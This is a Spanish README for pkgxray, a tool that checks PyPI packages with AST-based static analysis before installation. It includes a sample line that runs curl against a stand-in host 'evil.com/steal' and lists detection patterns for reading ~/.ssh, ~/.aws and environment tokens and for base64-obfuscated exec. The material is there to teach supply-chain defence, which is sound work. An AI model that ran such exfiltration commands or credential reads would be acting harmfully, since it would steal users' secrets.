![PyPI](https://img.shields.io/pypi/v/pkgxray)
![Python](https://img.shields.io/pypi/pyversions/pkgxray)
![License](https://img.shields.io/pypi/l/pkgxray)
![Tests](https://github.com/maip-fred/pkgxray/actions/workflows/publish.yml/badge.svg)
[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/maip-fred/pkgxray/blob/main/notebooks/pkgxray_tutorial.ipynb)

# pkgxray

**Radiografía de paquetes PyPI antes de instalarlos.**

Cuando ejecutas `pip install algo` confías ciegamente en que ese código es seguro.
pkgxray descarga el paquete **sin instalarlo**, extrae el código fuente y ejecuta
8 analizadores especializados basados en AST para detectar patrones maliciosos,
todo antes de que una sola línea del paquete se ejecute en tu máquina.

---

## El problema que resuelve

En PyPI existen paquetes maliciosos que:

- Roban API keys y tokens de variables de entorno
- Abren conexiones de red para exfiltrar datos
- Ejecutan comandos del sistema en segundo plano
- Inyectan código en `setup.py` que corre automáticamente al instalar
- Esconden payloads con `exec(base64.b64decode(...))`

Herramientas como `pip-audit` solo detectan CVEs ya reportados — no analizan el
comportamiento del código. pkgxray cubre ese vacío con análisis estático AST.

---

## Instalación

```bash
pip install pkgxray
```

Requiere Python 3.9+. Solo dos dependencias externas: `click` y `rich`.

---

## Inicio rápido

### Línea de comandos

```bash
# Analizar un paquete (salida en terminal con colores)
pkgxray scan requests

# Salida en JSON
pkgxray scan requests --format json

# Guardar reporte HTML
pkgxray scan requests --format html -o reporte.html

# Analizar una versión específica
pkgxray scan requests --version 2.28.0
```

### API de Python

```python
from pkgxray import scan
from pkgxray.reporter import generate_report

result = scan("requests")

print(f"Score de riesgo : {result.risk_score}/100")
print(f"Nivel de riesgo : {result.risk_level}")
print(f"Archivos analizados: {result.files_analyzed}")
print(f"Hallazgos totales  : {len(result.findings)}")

# Inspeccionar hallazgos individuales
for finding in result.findings:
    print(f"[{finding.severity.value.upper()}] {finding.analyzer_name}")
    print(f"  {finding.filename}:{finding.line_number}")
    print(f"  {finding.description}")

# Exportar
json_report = generate_report(result, format="json")
generate_report(result, format="html", output_path="reporte.html")
```

---

## Cómo funciona

```
pkgxray scan <paquete>
      │
      ▼
1. DESCARGA   → Consulta la API JSON de PyPI
                Descarga el .tar.gz o .whl (sin instalarlo)
      │
      ▼
2. EXTRACCIÓN → Descomprime el archivo
                Extrae todos los archivos .py (incluyendo setup.py)
      │
      ▼
3. ANÁLISIS   → Ejecuta 8 analizadores basados en AST en cada archivo
                El parseo AST entiende estructura del código, no solo texto
      │
      ▼
4. PUNTUACIÓN → Pondera hallazgos por severidad:
                LOW=1  MEDIUM=3  HIGH=7  CRITICAL=15
                Tope por analizador para evitar inflación por repetición
                Score final: 0–100
      │
      ▼
5. REPORTE    → Terminal (con colores via rich), JSON o HTML
```

**¿Por qué AST en lugar de regex?**

- Entiende la estructura del código, no solo el texto
- Más difícil de evadir: renombrar una variable no lo engaña
- Distingue `dict.get()` de `requests.get()` — no genera falsos positivos
- Usa el módulo `ast` de la biblioteca estándar, sin dependencias adicionales

---

## Los 8 analizadores

| Analizador | Qué detecta | Severidad |
|---|---|---|
| `code_exec` | `eval()`, `exec()`, `compile()` | HIGH – CRITICAL |
| `network` | `urlopen()`, `requests.get()`, `socket.connect()` | HIGH – CRITICAL |
| `filesystem` | `os.remove()`, `shutil.rmtree()`, rutas sensibles (`/etc/passwd`, `~/.ssh/`, `~/.aws/`) | HIGH – CRITICAL |
| `env_access` | `os.environ`, `os.getenv()`, acceso a API keys y tokens | LOW – HIGH |
| `subprocess` | `subprocess.Popen()`, `subprocess.run()`, `os.system()`, `os.execvp()` | HIGH – CRITICAL |
| `obfuscation` | `exec(base64.b64decode(...))`, `bytes.fromhex()`, strings con escape hexadecimal | MEDIUM – CRITICAL |
| `setup_scripts` | Hooks post-instalación en `setup.py` que sobreescriben `install.run()` | HIGH – CRITICAL |
| `dynamic_imports` | `__import__()`, `importlib.import_module()` con argumentos dinámicos | MEDIUM – HIGH |

### Detección de ejecución al nivel del módulo

pkgxray distingue entre código que se ejecuta **automáticamente al importar** el paquete
y código dentro de funciones que requiere invocación explícita.

```python
# CRÍTICO: corre en el momento que el usuario hace "import paquete"
subprocess.run(["curl", "http://evil.com/steal"])

# ALTO: solo corre si el usuario llama explícitamente a la función
def build():
    subprocess.run(["make"])
```

Las llamadas peligrosas al nivel del módulo se elevan automáticamente a **CRITICAL**
porque se ejecutarían sin ninguna acción del usuario.

### Qué NO flaggea (precisión)

pkgxray está calibrado para minimizar falsos positivos en paquetes legítimos:

- `import requests` — importar una librería no es sospechoso, solo usarla
- `import subprocess` — igual, solo se reportan las llamadas concretas
- `open(archivo, "w")` — escribir archivos es demasiado común para flaggearse
- `base64.b64decode(data)` — codificación estándar para auth headers, imágenes, TLS
- `import os` en `setup.py` — casi todo setup.py lo importa legítimamente
- `dict.get()`, `config.get()` — no se confunden con llamadas HTTP

---

## Escala de riesgo y scores de referencia

| Score | Nivel | Interpretación |
|---|---|---|
| 0 – 20 | LOW | Sin comportamiento sospechoso relevante |
| 21 – 40 | MODERATE | Algunos patrones comunes, probablemente legítimos |
| 41 – 70 | HIGH | Comportamiento activo de red, sistema o archivos |
| 71 – 100 | CRITICAL | Múltiples categorías de riesgo o patrones de malware |

**Scores aproximados de paquetes conocidos** (referencia orientativa):

| Paquete | Score típico | Por qué |
|---|---|---|
| `more-itertools` | ~15 LOW | Utilidades puras, sin red ni sistema |
| `attrs` | ~25 MODERATE | Introspección de clases, sin comportamiento externo |
| `click` | ~35 MODERATE | Algo de env y filesystem para la CLI |
| `requests` | ~55 HIGH | Conexiones HTTP activas, importa socket |
| `paramiko` | ~65 HIGH | Red (SSH), criptografía, lectura de archivos de clave |

> Un score alto no significa que el paquete sea malicioso — significa que tiene
> comportamiento que merece revisión. `requests` tiene score HIGH porque realmente
> hace conexiones de red, que es exactamente lo que se espera de un cliente HTTP.

---

## Comparativa con otras herramientas

| Herramienta | Qué analiza | Cuándo actúa | Analiza código |
|---|---|---|---|
| `pip-audit` / `safety` | CVEs en base de datos pública | Después de instalar | No |
| `bandit` | Tu propio código fuente | En tu repositorio | Sí, solo tu código |
| **`pkgxray`** | Comportamiento de paquetes de terceros | **Antes de instalar** | **Sí, con AST** |

pkgxray es **complementario** a pip-audit, no un reemplazo. Lo ideal es usar ambos:
pip-audit detecta vulnerabilidades conocidas en lo que ya tienes instalado,
pkgxray analiza el comportamiento de lo que estás a punto de instalar.

---

## Docker

```bash
# Ejecutar los tests
docker-compose run test

# Analizar "requests"
docker-compose run scan

# Analizar "requests" con salida JSON
docker-compose run scan-json
```

O directamente:

```bash
docker build -t pkgxray .
docker run pkgxray scan requests
docker run pkgxray scan requests --format json
```

---

## Desarrollo

```bash
# Clonar e instalar en modo desarrollo
git clone https://github.com/maip-fred/pkgxray.git
cd pkgxray
pip install -e ".[dev]"

# Tests unitarios (sin red, rápidos)
pytest tests/ -v -m "not slow"

# Todos los tests incluyendo integración
pytest tests/ -v

# Con reporte de cobertura
pytest tests/ --cov=pkgxray --cov-report=html -m "not slow"
```

---

## Licencia

MIT — ver [LICENSE](LICENSE)
